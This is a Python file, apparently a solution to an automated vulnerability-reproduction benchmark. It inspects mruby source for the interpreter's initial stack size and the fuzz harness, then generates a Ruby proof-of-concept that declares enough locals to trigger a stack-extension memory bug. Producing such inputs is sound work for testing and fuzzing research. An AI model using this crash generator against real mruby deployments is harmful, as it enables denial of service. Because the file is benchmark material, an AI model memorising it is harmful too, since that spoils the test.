import os
import re
import tarfile
from typing import Iterator, Tuple, Optional


_BASE36 = "0123456789abcdefghijklmnopqrstuvwxyz"


def _to_base36(n: int) -> str:
    if n == 0:
        return "0"
    s = []
    while n:
        n, r = divmod(n, 36)
        s.append(_BASE36[r])
    return "".join(reversed(s))


def _iter_source_files(src_path: str) -> Iterator[Tuple[str, bytes]]:
    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".rb"}
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                _, ext = os.path.splitext(fn)
                if ext.lower() not in exts:
                    continue
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                try:
                    with open(p, "rb") as f:
                        yield p, f.read()
                except OSError:
                    continue
    else:
        try:
            tf = tarfile.open(src_path, "r:*")
        except tarfile.TarError:
            return
        with tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > 2_000_000:
                    continue
                _, ext = os.path.splitext(m.name)
                if ext.lower() not in exts:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                yield m.name, data


def _parse_define_int(data: bytes, name: bytes) -> Optional[int]:
    # Matches: #define NAME 1024, # define NAME (0x400), etc.
    # Take the first integer-like token after the define.
    pat = re.compile(rb'^\s*#\s*define\s+' + re.escape(name) + rb'\s+(.+)$', re.M)
    m = pat.search(data)
    if not m:
        return None
    rhs = m.group(1)
    m2 = re.search(rb'(0x[0-9a-fA-F]+|\d+)', rhs)
    if not m2:
        return None
    tok = m2.group(1).decode("ascii", "ignore")
    try:
        return int(tok, 0)
    except ValueError:
        return None


def _generate_ruby_poc(n_locals: int) -> bytes:
    # Local-var prefix chosen to avoid keywords entirely.
    # Use semicolons to avoid deep parse trees.
    prefix = "q"
    parts = ["def a;"]
    for i in range(n_locals):
        parts.append(prefix)
        parts.append(_to_base36(i))
        parts.append("=0;")
    parts.append("end;a\n")
    return "".join(parts).encode("ascii", "strict")


class Solution:
    def solve(self, src_path: str) -> bytes:
        init_size = None
        saw_mruby = False
        uses_nstring = False
        uses_irep = False

        for _, data in _iter_source_files(src_path):
            if not saw_mruby and b"mrb_stack_extend" in data:
                saw_mruby = True

            if b"LLVMFuzzerTestOneInput" in data or b"FuzzerTestOneInput" in data:
                if (b"mrb_parse_nstring" in data) or (b"mrb_load_nstring" in data) or (b"mrb_load_string" in data):
                    uses_nstring = True
                if (b"mrb_load_irep" in data) or (b"mrb_read_irep" in data) or (b"mrb_load_irep_buf" in data):
                    uses_irep = True

            if b"MRB_STACK_INIT_SIZE" in data and b"#" in data:
                v = _parse_define_int(data, b"MRB_STACK_INIT_SIZE")
                if v is not None:
                    init_size = v if init_size is None else max(init_size, v)

        if init_size is None:
            init_size = 1024

        # Margin to account for existing frame/overhead and ensure extension triggers.
        n_locals = init_size + 16

        # If this doesn't look like MRuby at all, still return a benign Ruby-like payload.
        # (In practice for this task it should be MRuby.)
        if not saw_mruby:
            n_locals = max(256, min(n_locals, 2048))

        # If the harness appears to use irep-only loading (rare here), Ruby source may be ignored,
        # but we don't have a reliable bytecode generator here; still output the best guess.
        _ = uses_nstring, uses_irep

        return _generate_ruby_poc(n_locals)